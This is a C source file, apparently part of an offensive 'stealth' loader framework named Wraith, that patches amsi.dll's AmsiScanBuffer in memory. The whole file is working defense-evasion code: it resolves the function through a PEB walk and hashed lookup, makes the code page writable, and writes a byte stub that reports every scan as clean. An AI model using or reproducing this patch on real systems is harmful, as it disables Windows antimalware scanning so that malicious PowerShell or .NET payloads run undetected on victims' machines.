/*
 * src/stealth/amsi/amsi_patch.c
 *
 * Replace the first 14 bytes of `amsi.dll!AmsiScanBuffer` with a
 * stub that:
 *
 *  1. Loads the 6th argument (AMSI_RESULT *result) from [rsp+0x30].
 *  2. Writes 0 (AMSI_RESULT_CLEAN) into *result.
 *  3. Returns S_OK in EAX.
 *
 * Disassembly:
 *  48 8b 44 24 30  mov  rax, [rsp+30h]
 *  c7 00 00 00 00 00  mov  dword ptr [rax], 0
 *  33 c0  xor  eax, eax
 *  c3  ret
 *
 * AmsiScanBuffer's prologue is normal Win64 entry code (push rbp;
 * mov rbp, rsp; sub rsp, X; ...) which is much larger than 14
 * bytes, so the patch fits without overrunning into instruction
 * mid-bytes. Re-running install is idempotent (memcmp guard).
 *
 * Note: this patch is only effective for processes that actually
 * load amsi.dll. Pure PE loaders never invoke AMSI - the option
 * exists for consumers who pair Wraith with .NET / PowerShell hosts.
 */

#include "wraith/wraith_stealth.h"
#include "runtime/rt_pebwalk.h"
#include "runtime/rt_resolver.h"
#include "stealth/amsi/amsi_patch.h"
#include "stealth/hashing/hash_djb2.h"

#include <stdint.h>
#include <string.h>
#include <windows.h>

static const uint8_t kAmsiStub[] = {
  0x48, 0x8B, 0x44, 0x24, 0x30,  /* mov rax, [rsp+0x30]  */
  0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, /* mov dword [rax], 0  */
  0x33, 0xC0,  /* xor eax, eax  */
  0xC3  /* ret  */
};

wraith_status_t wr_amsi_patch_install(void)
{
  /* Make sure amsi.dll is loaded. PEB walk first - if not present,
  * LoadLibraryW it. */
  void *amsi = NULL;
  if (wr_pebwalk_find_module(wr_djb2_a("amsi.dll"), &amsi) != WRAITH_OK
  || !amsi) {
  HMODULE m = LoadLibraryW(L"amsi.dll");
  if (!m) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  amsi = (void *)m;
  }

  void *target = NULL;
  if (wr_resolver_lookup_a(amsi, "AmsiScanBuffer", &target) != WRAITH_OK
  || !target) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }

  if (memcmp(target, kAmsiStub, sizeof(kAmsiStub)) == 0) {
  return WRAITH_OK;
  }

  DWORD old = 0;
  if (!VirtualProtect(target, sizeof(kAmsiStub), PAGE_READWRITE, &old)) {
  return WRAITH_E_MAP_PROTECT_FAILED;
  }
  memcpy(target, kAmsiStub, sizeof(kAmsiStub));
  DWORD ignore = 0;
  VirtualProtect(target, sizeof(kAmsiStub), old, &ignore);
  FlushInstructionCache(GetCurrentProcess(), target, sizeof(kAmsiStub));
  return WRAITH_OK;
}

wraith_status_t wraith_patch_amsi(void)
{
#if WRAITH_USE_AMSI_PATCH
  return wr_amsi_patch_install();
#else
  return WRAITH_E_FEATURE_DISABLED;
#endif
}
